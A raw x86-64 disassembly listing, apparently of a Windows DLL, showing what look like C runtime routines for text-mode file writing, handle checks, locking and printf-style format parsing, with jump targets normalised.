add rcx 0x2
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
movzx eax [ rbx ]
xor r12d r12d
cmp ax 0xa
mov [ rsp + 0x40 ] ax
sete r12b
add rbx 0x2
mov [ rsp + 0x4c ] r12d
jmp r-xdata
cmp sil 0x2
jne r-xdata
movsx ecx cl
call sub_180013cdc
test eax eax
je r-xdata
mov al [ r15 + rdx + 0x4c ]
mov [ rsp + 0x61 ] cl
mov r8d 0x2
mov [ rsp + 0x60 ] al
and [ r15 + rdx + 0x50 ] 0x0
lea rdx [ rsp + 0x60 ]
jmp r-xdata
mov r15 [ rsp + 0x60 ]
call [ GetLastError@IAT ]
mov ebx eax
add esi [ rsp + 0x48 ]
cmp r15d esi
jg r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
cmp sil 0x1
je r-xdata
mov r12d [ rsp + 0x4c ]
mov r8d 0x1
mov rdx rbx
mov rax r14
sub rax rbx
add rax r13
cmp rax 0x1
jle r-xdata
lea rcx [ rsp + 0x40 ]
call sub_1800160b4
cmp eax 0xffffffff
je r-xdata
mov edi r12d
mov r8d 0xd
sub edi r13d
cmp edi r14d
jb r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
movsxd rcx esi
lea rdx [ rbp + rcx + 0x620 ]
mov r8d r15d
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov rax [ rsp + 0x60 ]
lea r9 [ rsp + 0x48 ]
mov rcx [ rax + rcx ]
sub r8d esi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
movzx ecx [ rsp + 0x40 ]
call sub_180015ee0
cmp ax [ rsp + 0x40 ]
jne r-xdata
cmp sil 0x2
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx [ rsp + 0x5c ]
lea rax [ rsp + 0x60 ]
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
inc rbx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r12d eax
test eax eax
je r-xdata
mov al [ rbx ]
lea rdx [ rw-data ]
inc edi
mov rcx [ rdx + r12 * 8 ]
mov [ r15 + rcx + 0x4c ] al
mov rax [ rdx + r12 * 8 ]
mov [ r15 + rax + 0x50 ] 0x1
lea rcx [ rsp + 0x40 ]
mov r8d 0x2
mov rdx rbx
call sub_1800160b4
cmp eax 0xffffffff
je r-xdata
lea rcx [ rsp + 0x70 ]
xor edx edx
cmp r15d esi
jg r-xdata
add edi 0x2
test r12d r12d
je r-xdata
mov r12 [ rsp + 0x50 ]
mov rcx [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov rcx [ rax + rcx * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d r12d
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc rbx
jmp r-xdata
mov r12d 0xd
mov ecx r12d
mov [ rsp + 0x40 ] r12w
call sub_180015ee0
cmp ax [ rsp + 0x40 ]
jne r-xdata
jmp r-xdata
mov edi ebx
sub edi r13d
add edi [ rsp + 0x44 ]
cmp [ rsp + 0x58 ] r12d
jl r-xdata
inc edi
inc [ rsp + 0x44 ]
cmp [ rsp + 0x4c ] 0x0
mov r12 [ rsp + 0x50 ]
je r-xdata
mov eax ebx
sub eax r13d
cmp eax r14d
jae r-xdata
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov [ rsp + 0x60 ] 0xd
mov rcx [ rax + r12 * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d 0x1
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x58 ] 0x1
jl r-xdata
inc [ rsp + 0x44 ]
inc edi
jmp r-xdata
sub_1800138c4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18000ea5c
and [ rax ] 0x0
call sub_18000ea3c
mov [ rax ] 0x9
jmp r-xdata
call sub_18000ea5c
and [ rax ] 0x0
call sub_18000ea3c
mov [ rax ] 0x9
call sub_18000e9d4
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_180015e10
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
call sub_18000ea5c
and [ rax ] 0x0
or ebx 0xffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_180013164
mov ebx eax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_180015eb8
mov eax ebx
jmp r-xdata
sub_1800139a4
push rbx
sub rsp 0x20
inc [ rw-data ]
mov rbx rcx
mov ecx 0x1000
call sub_18000f72c
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
or [ rbx + 0x18 ] 0x4
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x24 ] 0x2
mov [ rbx + 0x10 ] rax
or [ rbx + 0x18 ] 0x8
mov [ rbx + 0x24 ] 0x1000
jmp r-xdata
mov rax [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov [ rbx ] rax
add rsp 0x20
pop rbx
retn
sub_1800139f8
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
jmp r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
call sub_18000e9d4
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
movsxd rcx ecx
lea rdx [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
movsx eax [ rax + rcx + 0x8 ]
and eax 0x40
jmp r-xdata
add rsp 0x28
retn
sub_180013a60
push rbx
sub rsp 0x20
mov eax [ rw-data ]
mov ebx 0x14
test eax eax
jne r-xdata
cmp eax ebx
cmovl eax ebx
mov eax 0x200
jmp r-xdata
xor ecx ecx
lea rdx [ rw-data ]
lea edx [ rax + 0x8 ]
mov rcx rbx
mov [ rw-data ] ebx
call sub_18000f7ac
mov [ rw-data ] rax
test rax rax
jne r-xdata
movsxd rcx eax
mov edx 0x8
mov [ rw-data ] eax
call sub_18000f7ac
mov [ rw-data ] rax
test rax rax
jne r-xdata
xor r8d r8d
lea rdx [ rw-data ]
lea r9d [ r8 + 0x3 ]
mov rax [ rw-data ]
jmp r-xdata
mov eax 0x1a
jmp r-xdata
mov [ rdx ] 0xfffffffe
cmp r10 0xfffffffffffffffe
je r-xdata
mov [ rcx + rax ] rdx
add rdx 0x30
add rcx 0x8
dec rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r8
lea r10 [ rw-data ]
mov rax r8
sar rax 0x5
and ecx 0x1f
mov rax [ r10 + rax * 8 ]
imul rcx rcx 0x58
mov r10 [ rcx + rax ]
cmp r10 0xffffffffffffffff
je r-xdata
xor eax eax
test r10 r10
jne r-xdata
inc r8
add rdx 0x30
dec r9
jne r-xdata
sub_180013b68
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
cmp rbx rcx
jb r-xdata
lea rcx [ rbx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rbx rax
ja r-xdata
mov rdx rbx
mov rax 0x2aaaaaaaaaaaaaab
sub rdx rcx
imul rdx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_180012fa4
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_180013bcc
push rbx
sub rsp 0x20
mov rbx rdx
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
add ecx 0x10
call sub_180012fa4
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_180013c00
lea rdx [ rw-data ]
cmp rcx rdx
jb r-xdata
add rcx 0x30
jmp [ LeaveCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rcx rax
ja r-xdata
btr [ rcx + 0x18 ] 0xf
sub rcx rdx
mov rax 0x2aaaaaaaaaaaaaab
imul rcx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
jmp sub_180012ea4
sub_180013c94
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
call sub_18000cd7c
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180013cdc
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18000cd7c
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180013d24
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call [ EncodePointer@IAT ]
mov [ rbx ] rax
add rbx 0x8
dec rdi
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180013d5c
mov rax rsp
mov [ rax + 0x8 ] rcx
mov [ rax + 0x10 ] rdx
mov [ rax + 0x18 ] r8
mov [ rax + 0x20 ] r9
push rbx
push rdi
sub rsp 0x28
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
lea rdi [ rsp + 0x48 ]
call sub_180013a58
lea rdx [ rax + 0x30 ]
mov ecx 0x1
call sub_180013bcc
nop
call sub_180013a58
lea rcx [ rax + 0x30 ]
call sub_180016334
mov ebx eax
call sub_180013a58
mov r9 rdi
xor r8d r8d
mov rdx [ rsp + 0x40 ]
lea rcx [ rax + 0x30 ]
call sub_18000dd78
mov edi eax
call sub_180013a58
lea rdx [ rax + 0x30 ]
mov ecx ebx
call sub_180016408
nop
call sub_180013a58
lea rdx [ rax + 0x30 ]
mov ecx 0x1
call sub_180013c4c
mov eax edi
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
or eax 0xffffffff
jmp r-xdata
add rsp 0x28
pop rdi
pop rbx
retn
sub_180013e20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] r9w
push rbp
push rsi
push rdi
mov rbp rsp
sub rsp 0x60
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
test r8 r8
je r-xdata
cmp r8 0x7fffffff
jbe r-xdata
or [ rcx ] 0xffffffff
test rcx rcx
je r-xdata
mov rdx [ rbp + 0x40 ]
lea rcx [ rbp - 0x20 ]
call sub_18000cd7c
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] 0x0
jne r-xdata
call sub_18000ea3c
mov ebx 0x16
mov [ rax ] ebx
call sub_18000e9d4
xor eax eax
jmp r-xdata
and [ rcx ] edx
and [ rbp + 0x28 ] 0x0
mov ecx [ r11 + 0x4 ]
lea rax [ rbp + 0x28 ]
mov [ rsp + 0x38 ] rax
and [ rsp + 0x30 ] 0x0
lea r8 [ rbp + 0x38 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
movzx eax [ rbp + 0x38 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ rbp + 0x28 ] 0x0
jne r-xdata
test rsi rsi
je r-xdata
test rsi rsi
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x2a
call sub_18000ea3c
cmp [ rbp - 0x8 ] 0x0
mov eax [ rax ]
je r-xdata
test rsi rsi
je r-xdata
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
test rdi rdi
jne r-xdata
test rdi rdi
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
call sub_18000ea3c
mov ebx 0x22
mov [ rax ] ebx
call sub_18000e9d4
cmp [ rbp - 0x8 ] 0x0
je r-xdata
test rdi rdi
je r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov [ rbx ] eax
jmp r-xdata
mov [ rbx ] 0x1
mov [ rsi ] al
call sub_18000ea3c
lea ebx [ rdi + 0x22 ]
mov [ rax ] ebx
call sub_18000e9d4
cmp [ rbp - 0x8 ] dil
je r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_18000bd10
mov eax ebx
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_18000bd10
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180013ff8
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
mov bpl cl
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
mov cl bpl
dec ebx
call sub_18000dd30
cmp [ rdi ] 0xffffffff
je r-xdata
sub_18001404c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx r9
mov rsi r8
mov edi edx
mov rbp rcx
call sub_18000ea3c
test [ rsi + 0x18 ] 0x40
mov r12d [ rax ]
je r-xdata
call sub_18000ea3c
and [ rax ] 0x0
jmp r-xdata
cmp [ rsi + 0x10 ] 0x0
jne r-xdata
test edi edi
jg r-xdata
add [ rbx ] edi
jmp r-xdata
mov cl [ rbp ]
mov r8 rbx
mov rdx rsi
dec edi
call sub_18000dd30
inc rbp
cmp [ rbx ] 0xffffffff
jne r-xdata
call sub_18000ea3c
cmp [ rax ] 0x0
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
call sub_18000ea3c
cmp [ rax ] 0x2a
jne r-xdata
call sub_18000ea3c
mov [ rax ] r12d
mov r8 rbx
mov rdx rsi
mov cl 0x3f
call sub_18000dd30
sub_1800140f4
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1d0 ]
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x70 ] rcx
mov [ rsp + 0x68 ] rdx
lea rcx [ rbp - 0x80 ]
mov rdx r8
mov r15 r9
mov [ rsp + 0x64 ] eax
mov r13d eax
mov [ rsp + 0x58 ] eax
mov edi eax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x54 ] eax
call sub_18000cd7c
xor r10d r10d
test rbx rbx
jne r-xdata
or r14d 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
je r-xdata
mov rdx [ rsp + 0x68 ]
test rdx rdx
je r-xdata
mov rcx rbx
call sub_180013c6c
lea rdx [ rw-data ]
cmp eax r14d
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
mov r12b [ rdx ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x48 ] r10d
mov r8d r10d
mov [ rbp - 0x60 ] r10
test r12b r12b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rbp + 0x1c8 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r14d
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x68 ] r10b
je r-xdata
mov rbx [ rbp - 0x50 ]
mov r11d 0x200
cmp eax r14d
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x330e0 ]
jmp r-xdata
mov eax esi
mov rcx [ rbp - 0x70 ]
and [ rcx + 0xc8 ] 0xfffffffd
test r8d r8d
je r-xdata
lea eax [ r12 - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
cmp r8d 0x7
jne r-xdata
mov ecx r10d
movsx rax r12b
movzx ecx [ rax + r9 + 0x23420 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x330e0 ]
mov ecx r8d
test r8d r8d
je r-xdata
movsxd rax ecx
lea rcx [ rax + rax * 8 ]
movsxd rax r8d
add rcx rax
movzx r8d [ rcx + r9 + 0x23440 ]
shr r8d 0x4
mov [ rsp + 0x60 ] r8d
cmp r8d 0x8
je r-xdata
lea rdx [ rbp - 0x80 ]
movzx ecx r12b
mov [ rsp + 0x54 ] r10d
call sub_180013c94
xor esi esi
test eax eax
je r-xdata
dec ecx
je r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_18000dd30
mov esi [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_18000dd30
mov rdx [ rsp + 0x68 ]
mov r12b [ rdx ]
inc rdx
mov [ rsp + 0x68 ] rdx
test r12b r12b
je r-xdata
mov [ rsp + 0x78 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x4c ] r10d
mov r13d r10d
mov edi r14d
mov [ rsp + 0x44 ] r14d
mov [ rsp + 0x54 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov rdx [ rsp + 0x68 ]
mov r8d [ rsp + 0x60 ]
mov r11d 0x200
lea r9 [ __dos_header ]
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
cmp [ rbp - 0x68 ] sil
jmp r-xdata
mov r12b [ rdx ]
test r12b r12b
jne r-xdata
cmp r12b 0x20
je r-xdata
dec ecx
je r-xdata
inc rdx
mov [ rsp + 0x68 ] rdx
test esi esi
js r-xdata
je r-xdata
or r13d 0x2
jmp r-xdata
cmp r12b 0x23
je r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r13d 0x7
jmp r-xdata
cmp r12b 0x2b
je r-xdata
mov eax [ rsp + 0x58 ]
lea ecx [ rax + rax * 4 ]
movsx eax r12b
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r15 ]
add r15 0x8
mov [ rsp + 0x58 ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r13d 0x1
jmp r-xdata
cmp r12b 0x2d
je r-xdata
or r13d 0x4
neg eax
jmp r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
or r13d 0x4
jmp r-xdata
cmp r12b 0x30
jne r-xdata
mov [ rsp + 0x58 ] eax
jmp r-xdata
lea ecx [ rdi + rdi * 4 ]
movsx eax r12b
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x44 ] edi
jmp r-xdata
mov edi [ r15 ]
add r15 0x8
mov [ rsp + 0x44 ] edi
test edi edi
jns r-xdata
cmp r12b 0x49
je r-xdata
dec ecx
jne r-xdata
or r13d 0x8
jmp r-xdata
mov edi r14d
mov [ rsp + 0x44 ] r14d
jmp r-xdata
mov al [ rdx ]
bts r13d 0xf
cmp al 0x36
jne r-xdata
cmp r12b 0x68
je r-xdata
movsx eax r12b
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ rdx + 0x1 ] 0x34
jne r-xdata
or r13d 0x20
jmp r-xdata
cmp r12b 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ rdx + 0x1 ] 0x32
jne r-xdata
add rdx 0x2
bts r13d 0xf
jmp r-xdata
cmp [ rdx ] 0x6c
jne r-xdata
cmp r12b 0x77
jne r-xdata
cmp [ rsp + 0x5c ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r13d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add rdx 0x2
btr r13d 0xf
jmp r-xdata
or r13d 0x10
jmp r-xdata
inc rdx
bts r13d 0xc
jmp r-xdata
bts r13d 0xb
jmp r-xdata
mov rax [ rbp - 0x60 ]
test rax rax
je r-xdata
test r13b 0x40
je r-xdata
or r13d 0x40
lea rbx [ rbp - 0x40 ]
mov esi r11d
test edi edi
jns r-xdata
cmp eax 0x69
je r-xdata
mov r8 [ r15 ]
add r15 0x8
jmp r-xdata
bt r13d 0xc
jae r-xdata
mov [ rsp + 0x78 ] 0x1
add r12b 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov edi [ rsp + 0x44 ]
mov rcx rax
call sub_18000ec1c
xor r10d r10d
mov [ rbp - 0x60 ] r10
mov edi [ rsp + 0x4c ]
bt r13d 0x8
jae r-xdata
jne r-xdata
mov [ rsp + 0x44 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test r13b 0x40
je r-xdata
add r15 0x8
test r13b 0x20
je r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
mov r8 rsi
mov edx edi
call sub_18001404c
test r13b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x20
call sub_180013ff8
test r13b 0x1
je r-xdata
mov [ rsp + 0x50 ] 0x2d
jmp r-xdata
cmp edi r11d
cmovg edi r11d
mov [ rsp + 0x44 ] edi
cmp edi 0xa3
jle r-xdata
cmp r12b 0x67
jne r-xdata
mov rax [ r15 ]
mov rcx [ rw-data ]
add r15 0x8
movsx edi r12b
movsxd rsi esi
mov [ rbp - 0x50 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x80 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x78 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
mov ecx [ rsp + 0x44 ]
mov rdx rbx
mov [ rsp + 0x20 ] ecx
lea rcx [ rbp - 0x50 ]
call rax
mov edi r13d
and edi 0x80
je r-xdata
mov rdi [ r15 ]
add r15 0x8
call sub_180013e08
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x6f
je r-xdata
test eax r13d
jne r-xdata
test r8 r8
jns r-xdata
test r13b 0x40
je r-xdata
test r13b 0x40
je r-xdata
add r15 0x8
test r13d 0x810
je r-xdata
bts r13d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x48 ]
xor eax eax
cmp [ rsp + 0x54 ] eax
je r-xdata
test r13b 0x4
jne r-xdata
test r13b 0x2
je r-xdata
mov [ rsp + 0x50 ] 0x2b
mov edi 0x1
mov [ rsp + 0x4c ] edi
jmp r-xdata
add edi 0x15d
movsxd rcx edi
call sub_18000f72c
mov [ rbp - 0x60 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x44 ] 0x1
jmp r-xdata
cmp r12b 0x67
jne r-xdata
xor eax eax
cmp [ rsp + 0x44 ] eax
jne r-xdata
test r13b 0x20
je r-xdata
mov r9d 0x8
test r13b r13b
jns r-xdata
cmp eax 0x70
je r-xdata
test edi edi
jns r-xdata
bt r13d 0xc
jb r-xdata
neg r8
bts r13d 0x8
mov r8d [ r15 - 0x8 ]
movsxd r8 [ r15 - 0x8 ]
jmp r-xdata
movzx r8d [ r15 - 0x8 ]
jmp r-xdata
movsx r8 [ r15 - 0x8 ]
jmp r-xdata
mov al [ r15 - 0x8 ]
mov [ rsp + 0x48 ] 0x1
mov [ rbp - 0x40 ] al
movzx r9d [ r15 - 0x8 ]
lea rdx [ rbp - 0x40 ]
lea rcx [ rsp + 0x48 ]
mov r8 r11
call sub_180013fe4
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx edi
mov rcx rbx
call sub_18001404c
xor r10d r10d
test edi edi
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x30
call sub_180013ff8
mov [ rsp + 0x50 ] 0x20
jmp r-xdata
mov r12d [ rsp + 0x58 ]
mov rsi [ rsp + 0x70 ]
sub r12d [ rsp + 0x48 ]
sub r12d edi
test r13b 0xc
jne r-xdata
mov [ rsp + 0x44 ] 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
cmp [ rbx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov edx [ rsp + 0x4c ]
or r13d r11d
jmp r-xdata
mov edi 0x10
bts r13d 0xf
cmp eax 0x73
je r-xdata
and r13d 0xfffffff7
cmp edi r11d
cmovg edi r11d
mov edi 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x40 ]
jmp r-xdata
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x60 ] r10d
test r13b 0x4
je r-xdata
mov rsi rbx
mov rcx rbx
call sub_1800112a0
mov esi [ rsp + 0x40 ]
bts r13d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x50 ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x51 ] al
jmp r-xdata
mov rbx [ r15 ]
cmp edi r14d
mov eax edi
mov ecx 0x7fffffff
cmove eax ecx
add r15 0x8
test r13d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov esi [ rsp + 0x64 ]
mov rax r8
lea rbx [ rbp + 0x1bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x4c ] ecx
bts r13d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
mov edx r12d
mov cl 0x20
call sub_180013ff8
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov esi r14d
mov [ rsp + 0x40 ] r14d
jmp r-xdata
